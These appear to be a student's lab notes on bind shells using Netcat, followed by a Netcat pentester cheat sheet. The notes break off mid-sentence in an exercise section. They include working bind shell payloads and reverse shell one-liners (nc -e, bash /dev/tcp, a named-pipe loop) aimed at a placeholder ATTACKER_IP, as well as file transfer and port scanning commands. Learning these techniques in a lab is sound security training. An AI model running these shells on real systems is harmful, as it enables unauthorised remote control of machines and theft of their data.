# 1️⃣ What Is a Bind Shell?

In many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell.

This is typically done by using a:

- **Bind Shell**
    
- **Reverse Shell**
    

---

## 🔹 What Is It?

With a **bind shell**, the target system:

- Starts a listener
    
- Waits for an incoming connection
    
- The pentester (attacker) connects to that open port
    

---

## 📊 Bind Shell Diagram

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/1%2Ak5kQuDcgISOgpDNuD36MEQ.jpeg)

![Image](https://www.akamai.com/site/en/images/blog/2024/october-cups-ddos-threat-three.png)

![Image](https://www.uptycs.com/hubfs/visual-studio-code-remote-code-execution-vulnerability-cve-2022-41034-e.png)

Example scenario:

- Pentester (Attack Box): `10.10.14.15`
    
- Target: `10.10.14.20`
    
- Listening Port: `1337`
    

The attacker connects directly to the IP and listening port on the target.

---

# 2️⃣ Challenges with Bind Shells

There are many challenges associated with getting a shell this way:

- There must already be a listener started on the target.
    
- If no listener exists, we must find a way to make this happen.
    
- Admins typically configure strict incoming firewall rules.
    
- NAT (with PAT implementation) is usually configured on public-facing networks.
    
- Operating system firewalls (Windows & Linux) block most incoming connections.
    
- IDS/IPS may detect unusual listening ports.
    

⚠ Bind shells are easier to defend against because the connection is incoming.

---

# 3️⃣ GNU Netcat (nc)

The tool used in this example is **GNU Netcat**.

Netcat is considered our:

> 🛠 Swiss-Army Knife of networking

Capabilities:

- Works over TCP
    
- Works over UDP
    
- Supports Unix sockets
    
- Supports IPv4 & IPv6
    
- Opens and listens on sockets
    
- Can act as a proxy
    
- Handles text input/output
    

We use:

- `nc` on the attack box → Client
    
- `nc` on the target → Server
    

---

# 4️⃣ Practicing with GNU Netcat (Basic TCP Session)

Scenario:

- Target: Ubuntu Linux
    
- Same network
    
- No restrictions
    

---

## 🖥 Step 1 – Server (Target) Starts Listener

On the target:

```bash
nc -lvnp 7777
```

Output:

```bash
Listening on [0.0.0.0] (family 0, port 7777)
```

Breakdown:

- `-l` → Listen
    
- `-v` → Verbose
    
- `-n` → No DNS resolution
    
- `-p` → Port
    

---

## 🖥 Step 2 – Client (Attack Box) Connects

On attack box:

```bash
nc -nv 10.129.41.200 7777
```

Output:

```bash
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

---

## 🖥 Step 3 – Server Receives Connection

```bash
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

---

## 🔎 Important

This is NOT a proper shell.

It is just a **raw TCP session**.

We are only passing text between two systems.

---

## 🖥 Step 4 – Sending Text

Client types:

```bash
Hello Academy
```

Server receives:

```bash
Hello Academy
```

---

## 📊 Netcat Text Communication Flow

![Image](https://www.ionos.com/digitalguide/fileadmin/DigitalGuide/Screenshots_2020/netcat-5.png)

![Image](https://home.cc.umanitoba.ca/~psgendb/nc/thinclient.gif)

![Image](https://docs.vultr.com/public/doc-assets/2012/778f787e-94ce-4505-ac11-22066b586a6a.png)

This demonstrates:

- Bidirectional text pipe
    
- No shell interaction
    
- No OS control
    

---

# 5️⃣ Establishing a Real Bind Shell

Now we serve a real shell over TCP.

On the **server (target)**:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

---

## 🔍 Breaking Down the Payload

This entire command is our **payload**.

### Components:

- `rm -f /tmp/f`  
    Remove old named pipe if exists
    
- `mkfifo /tmp/f`  
    Create named pipe
    
- `cat /tmp/f`  
    Read input from pipe
    
- `/bin/bash -i`  
    Start interactive Bash shell
    
- `2>&1`  
    Redirect stderr to stdout
    
- `nc -l 10.129.41.200 7777`  
    Listen on IP and port
    
- `> /tmp/f`  
    Send output back into pipe
    

This creates a loop between:

- Netcat
    
- Named pipe
    
- Bash
    

---

## 🖥 Client Connects to Bind Shell

On attack box:

```bash
nc -nv 10.129.41.200 7777
```

Now you will see:

```bash
Target@server:~$
```

You now have:

✅ Real shell access  
✅ OS command execution  
✅ File system access

---

## 📊 Bind Shell with Bash Flow

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1040/0%2AgCB19x1UCW84P0dW.jpg)

![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/netcat-commands-port-scan-2.png?hsLang=en)

![Image](https://blog.ropnop.com/images/2017/07/oops_ctrl_c.png)

---

# 6️⃣ Why This Worked

In this lab:

- We controlled both systems.
    
- No firewall restrictions.
    
- No NAT blocking inbound traffic.
    
- No IDS/IPS.
    
- No endpoint protection.
    
- No authentication restrictions.
    

This is NOT realistic in real-world engagements.

This was done to understand:

- How bind shells work
    
- How Netcat operates
    
- How shell redirection functions
    
- How payloads are structured
    

---

# 7️⃣ Why Bind Shells Are Easier to Defend Against

Because:

- Connection is incoming.
    
- Most networks block unsolicited inbound traffic.
    
- OS firewalls block unknown listeners.
    
- IDS/IPS detect suspicious open ports.
    
- EDR flags suspicious listening processes.
    

Even if using standard ports like:

- 80
    
- 443
    

It may still be detected.

---

# 8️⃣ Bind Shell Summary

|Feature|Bind Shell|
|---|---|
|Listener Location|Target|
|Connection Direction|Attacker → Target|
|Firewall Friendly|❌ No|
|Detection Risk|High|
|Common in Real World|Less common|

---

# 9️⃣ Key Takeaways for Pentesters

✔ Understand how listeners work  
✔ Understand port binding  
✔ Know how to use `nc` properly  
✔ Understand redirection (`2>&1`)  
✔ Understand named pipes (`mkfifo`)  
✔ Recognize when a shell is NOT interactive  
✔ Know why bind shells fail in real networks

---

# 🔟 Concept Flow

```text
Target → Opens Listener
Attacker → Connects to Target
Netcat → Bridges TCP Session
Bash → Serves Interactive Shell
```

---

In the next section, reverse shells will show how attackers bypass inbound firewall restrictions by making the victim initiate the connection instead.

---
# 🛠 Netcat (nc) Full Cheat Sheet – Pentester Reference (Table Format)

---

# 1️⃣ Netcat Overview

|Feature|Description|
|---|---|
|Tool Name|Netcat (`nc`)|
|Nickname|Swiss Army Knife of Networking|
|Protocol Support|TCP, UDP, Unix sockets|
|Operating Systems|Linux, Windows, macOS|
|Common Uses|Bind shells, reverse shells, port scanning, file transfer, banner grabbing|
|Pentest Importance|Extremely critical|

---

# 2️⃣ Netcat Basic Syntax

|Syntax|Description|
|---|---|
|nc [options] IP PORT|Connect to IP and port|
|nc -l PORT|Listen on port|
|nc -lvnp PORT|Listen verbose numeric|

---

# 3️⃣ Netcat Modes

|Mode|Command|Description|
|---|---|---|
|Client mode|nc TARGET_IP PORT|Connect to target|
|Listen mode|nc -l PORT|Listen for connection|
|Verbose listen|nc -lvnp PORT|Detailed listener|
|UDP mode|nc -u IP PORT|UDP connection|

---

# 4️⃣ Listener Setup (Attacker)

|Purpose|Command|
|---|---|
|Basic listener|nc -l 4444|
|Verbose listener|nc -lvnp 4444|
|Listen specific IP|nc -l ATTACKER_IP 4444|
|UDP listener|nc -luvp 4444|

Example:

```bash
nc -lvnp 4444
```

---

# 5️⃣ Connect to Listener (Victim or Attacker)

|Purpose|Command|
|---|---|
|Basic connect|nc TARGET_IP 4444|
|Verbose connect|nc -nv TARGET_IP 4444|
|UDP connect|nc -u TARGET_IP 4444|

Example:

```bash
nc -nv 10.10.10.5 4444
```

---

# 6️⃣ Bind Shell Commands

## Linux Bind Shell

|Purpose|Command|
|---|---|
|Bind bash shell|nc -lvnp 4444 -e /bin/bash|
|Bind sh shell|nc -lvnp 4444 -e /bin/sh|

Alternative method:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f
```

---

## Windows Bind Shell

|Purpose|Command|
|---|---|
|Bind cmd shell|nc -lvnp 4444 -e cmd.exe|

---

# 7️⃣ Reverse Shell Commands

## Listener (Attacker)

```bash
nc -lvnp 4444
```

---

## Linux Reverse Shell (Victim)

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

Alternative:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Windows Reverse Shell

```cmd
nc.exe ATTACKER_IP 4444 -e cmd.exe
```

---

# 8️⃣ File Transfer Using Netcat

---

## Receive File (Receiver)

```bash
nc -lvnp 4444 > file.txt
```

---

## Send File (Sender)

```bash
nc TARGET_IP 4444 < file.txt
```

---

# 9️⃣ Banner Grabbing

|Purpose|Command|
|---|---|
|Grab banner|nc TARGET_IP PORT|
|HTTP banner|nc TARGET_IP 80|
|SMTP banner|nc TARGET_IP 25|

Example:

```bash
nc 10.10.10.5 80
```

Then type:

```bash
GET / HTTP/1.0
```

---

# 🔟 Port Scanning with Netcat

|Purpose|Command|
|---|---|
|Scan single port|nc -zv TARGET_IP PORT|
|Scan port range|nc -zv TARGET_IP 1-1000|
|Scan UDP ports|nc -zvu TARGET_IP PORT|

Example:

```bash
nc -zv 10.10.10.5 1-1000
```

---

# 1️⃣1️⃣ Chat Server Example

## Listener

```bash
nc -lvnp 4444
```

## Client

```bash
nc TARGET_IP 4444
```

Both can now chat.

---

# 1️⃣2️⃣ Netcat Options Cheat Sheet

|Option|Meaning|
|---|---|
|-l|Listen mode|
|-v|Verbose|
|-n|Numeric only|
|-p|Specify port|
|-e|Execute program|
|-u|UDP mode|
|-z|Scan mode|
|-w|Timeout|
|-k|Keep open|

---

# 1️⃣3️⃣ Netcat Verification Commands

|Command|Purpose|
|---|---|
|netstat -antp|Show connections|
|ss -antp|Alternative|
|ps aux|Show processes|
|lsof -i|Show open ports|

---

# 1️⃣4️⃣ Common Pentest Scenarios

|Scenario|Command|
|---|---|
|Reverse shell listener|nc -lvnp 4444|
|Bind shell connect|nc TARGET_IP 4444|
|Transfer file receive|nc -lvnp 4444 > file|
|Transfer file send|nc TARGET_IP 4444 < file|
|Banner grabbing|nc TARGET_IP 80|
|Scan ports|nc -zv TARGET_IP 1-1000|

---

# 1️⃣5️⃣ Linux Named Pipe Reverse Shell (Advanced)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

# 1️⃣6️⃣ Stabilize Shell After Connection

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
stty raw -echo
```

---

# 1️⃣7️⃣ Windows Netcat Locations

|Location|Example|
|---|---|
|Kali Linux|/usr/bin/nc|
|Windows|nc.exe|
|Parrot OS|/bin/nc|

Check location:

```bash
which nc
```

---

# 1️⃣8️⃣ Troubleshooting Netcat

|Problem|Solution|
|---|---|
|Connection refused|Check listener|
|No response|Check firewall|
|Command not found|Install netcat|
|No shell interaction|Use proper payload|

---

# 1️⃣9️⃣ Install Netcat

## Linux

```bash
sudo apt install netcat
```

or

```bash
sudo apt install netcat-traditional
```

---

## Windows

Download:

- nc.exe
    
- ncat.exe
    

---

# 2️⃣0️⃣ Quick Reference (Most Important)

|Task|Command|
|---|---|
|Listener|nc -lvnp 4444|
|Connect|nc TARGET_IP 4444|
|Reverse shell|nc ATTACKER_IP 4444 -e /bin/bash|
|Bind shell|nc -lvnp 4444 -e /bin/bash|
|File receive|nc -lvnp 4444 > file|
|File send|nc TARGET_IP 4444 < file|
|Scan port|nc -zv TARGET_IP PORT|

---

### Excercises
![[Pasted image 20260214105544.png]]

### Steps to get answers

Step1.  The answer for the 1st question is inside the question because if we want to connect the target system the bind shell's ip 